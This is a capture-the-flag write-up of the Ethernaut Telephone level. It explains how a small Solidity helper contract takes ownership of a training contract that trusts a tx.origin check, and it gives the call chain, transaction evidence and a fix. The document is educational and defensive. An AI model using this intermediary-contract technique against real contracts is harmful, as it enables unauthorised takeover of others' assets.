# Ethernaut Telephone — Ownership Takeover Through tx.origin Caller Confusion

## Summary

The Telephone level demonstrates caller identity confusion caused by unsafe use of `tx.origin` and `msg.sender`.

The exploit uses a helper contract to create this call chain:

```text
player wallet -> helper contract -> Telephone contract
```

Inside the Telephone contract, `tx.origin` remains the player wallet, while `msg.sender` becomes the helper contract. This makes the condition `tx.origin != msg.sender` true and allows ownership to be changed.

## Bug Pattern

Caller identity confusion / unsafe `tx.origin` logic.

## Vulnerable Assumption

The contract assumes that `tx.origin != msg.sender` is a safe condition for changing ownership.

## Attack Path

1. Deploy a helper contract with the Telephone instance address.
2. Call `helper.attack(player)`.
3. The helper contract calls `Telephone.changeOwner(player)`.
4. Inside Telephone:
   - `tx.origin = player`
   - `msg.sender = helper`
   - `_owner = player`
5. The condition `tx.origin != msg.sender` passes.
6. Telephone sets `owner = player`.

## Helper Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHelper {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address newOwner) public {
        target.changeOwner(newOwner);
    }
}
```

## Address Roles

```text
player = my wallet address
instance = Telephone victim contract address
helper = attacker-controlled middleman contract
constructor parameter = instance
attack(newOwner) parameter = player
inside Telephone msg.sender = helper
inside Telephone tx.origin = player
final owner = player
```

## Evidence

The exploit transaction had this structure:

```text
External transaction:
player -> helper.attack(player)

Internal call:
helper -> Telephone.changeOwner(player)

State change:
Telephone.owner changed from the previous owner to player
```

The external transaction was sent from the player wallet to the helper contract. During execution, the helper contract made an internal call to the Telephone contract and called `changeOwner(player)`.

The state-diff view confirmed that the Telephone owner storage changed from the previous owner to the player wallet.

## Fix

Do not use `tx.origin` for authorization or ownership logic. Use `msg.sender` with explicit access control.

## Real-World Relevance

Contracts that rely on `tx.origin` for authorization can be vulnerable to malicious intermediary contracts and phishing-style call chains. Auditors should treat `tx.origin` in access-control logic as a major red flag.

## What I Learned

- `tx.origin` is the original wallet that started the transaction.
- `msg.sender` is the direct caller of the current contract.
- Helper contracts can change the `msg.sender` seen by the target.
- Block explorers show the external transaction and internal contract calls separately.
